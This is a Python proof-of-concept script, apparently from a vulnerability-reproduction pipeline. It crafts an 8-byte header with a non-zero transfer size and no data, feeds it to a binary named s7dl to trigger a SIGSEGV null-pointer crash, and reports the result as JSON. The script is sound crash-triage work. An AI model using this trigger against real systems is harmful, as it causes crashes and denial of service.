#!/usr/bin/env python3
"""PoC for s7dl binary: reproduces a SIGSEGV crash via a crafted input.

The binary reads an 8-byte header (block_num:i32 + transfer_size:i32, little-endian)
followed by an optional data buffer. When transfer_size > 0 but no data follows
the header, the binary dereferences a null/invalid pointer and crashes with SIGSEGV.

Usage:
    python3 poc.py --binary /path/to/s7dl [--json-out path] [--timeout 10]
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time


def build_trigger_input():
    """Build the trigger payload in memory.

    The minimal crash trigger is an 8-byte header with a non-zero transfer_size
    and no data buffer. The binary reads buff_len from the actual file size and
    when buff_len == 0 but transfer_size > 0, it dereferences an invalid pointer.
    """
    block_num = 0
    transfer_size = 1
    header = struct.pack("<ii", block_num, transfer_size)
    return header  # no data buffer


def run_binary(binary_path, input_path, timeout):
    """Run the target binary once and capture the outcome."""
    cmd = [binary_path, input_path]
    start = time.monotonic()
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            timeout=timeout,
        )
        timed_out = False
        elapsed_ms = int((time.monotonic() - start) * 1000)
    except subprocess.TimeoutExpired:
        timed_out = True
        elapsed_ms = int((time.monotonic() - start) * 1000)
        return {
            "binary": binary_path,
            "command": cmd,
            "returncode": None,
            "signal": None,
            "timed_out": True,
            "runtime_ms": elapsed_ms,
            "stdout": "",
            "stderr": "",
            "observable": {"kind": "custom", "value": "timeout", "path": None},
            "error": None,
        }

    rc = proc.returncode
    stdout_str = proc.stdout.decode("utf-8", errors="replace")
    stderr_str = proc.stderr.decode("utf-8", errors="replace")

    # Determine the observable outcome
    if rc < 0:
        # Process was terminated by a signal
        signum = -rc
        try:
            sig_name = signal.Signals(signum).name
        except ValueError:
            sig_name = f"SIGNUM_{signum}"
        observable_value = f"crash:{sig_name}"
        signal_name = sig_name
    else:
        observable_value = f"exit:{rc}"
        signal_name = None

    return {
        "binary": binary_path,
        "command": cmd,
        "returncode": rc,
        "signal": signal_name,
        "timed_out": timed_out,
        "runtime_ms": elapsed_ms,
        "stdout": stdout_str,
        "stderr": stderr_str,
        "observable": {"kind": "custom", "value": observable_value, "path": None},
        "error": None,
    }


def main():
    parser = argparse.ArgumentParser(
        description="PoC for s7dl binary crash reproduction"
    )
    parser.add_argument(
        "--binary", required=True, help="Path to the target binary"
    )
    parser.add_argument(
        "--json-out", default=None, help="Path to write JSON result file"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Timeout in seconds (default: 10)",
    )
    args = parser.parse_args()

    binary_path = os.path.abspath(args.binary)

    if not os.path.isfile(binary_path):
        print(json.dumps({"error": f"Binary not found: {binary_path}"}))
        sys.exit(1)

    # Build the trigger input at runtime
    payload = build_trigger_input()

    # Write to a temporary file
    with tempfile.NamedTemporaryFile(prefix="s7dl_poc_", suffix=".bin", delete=False) as f:
        f.write(payload)
        input_path = f.name

    try:
        result = run_binary(binary_path, input_path, args.timeout)
    finally:
        # Clean up the temp file
        try:
            os.unlink(input_path)
        except OSError:
            pass

    # Output JSON to stdout
    json_output = json.dumps(result, indent=2)
    print(json_output)

    # Optionally write to a file
    if args.json_out:
        with open(args.json_out, "w") as f:
            f.write(json_output)
            f.write("\n")


if __name__ == "__main__":
    main()